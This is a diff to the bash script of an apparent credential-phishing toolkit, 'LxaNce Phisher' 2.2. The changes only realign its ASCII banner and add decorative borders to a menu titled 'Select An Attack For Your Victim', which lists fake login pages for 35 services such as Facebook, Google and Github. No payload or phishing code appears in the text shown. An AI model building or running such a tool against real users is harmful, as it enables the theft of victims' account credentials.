@@ -143,10 +143,10 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${GREEN}
-		${GREEN} 		+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-		${GREEN} 		|L|x|a|N|c|e| |P|h|i|s|h|e|r|
-		${GREEN} 		+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-		${RED}                                         Version : 2.2
+		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+		${GREEN} 	|L|x|a|N|c|e| |P|h|i|s|h|e|r|
+		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
+		${RED}                                Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
@@ -159,8 +159,8 @@ banner_small() {
 		${BLUE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
 		${BLUE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
 		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀
-		${WHITE}                                2.2
-							
+		${WHITE}                               2.2			   
+		${RED}[${WHITE}::${RED}]${ORANGE}**********************************${RED}[${WHITE}::${RED}]${ORANGE}					
 	EOF
 }
 
@@ -644,7 +644,7 @@ main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
-															
+		${RED}[${WHITE}::${RED}]${ORANGE}                                  ${RED}[${WHITE}::${RED}]${ORANGE}												
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
@@ -657,8 +657,9 @@ main_menu() {
 		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} ApnaPSIT      ${RED}[${WHITE}35${RED}]${ORANGE} Discord
-
+		${RED}[${WHITE}::${RED}]${ORANGE}**********************************${RED}[${WHITE}::${RED}]${ORANGE}
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}::${RED}]${ORANGE}**********************************${RED}[${WHITE}::${RED}]${ORANGE}
 
 	EOF
 	
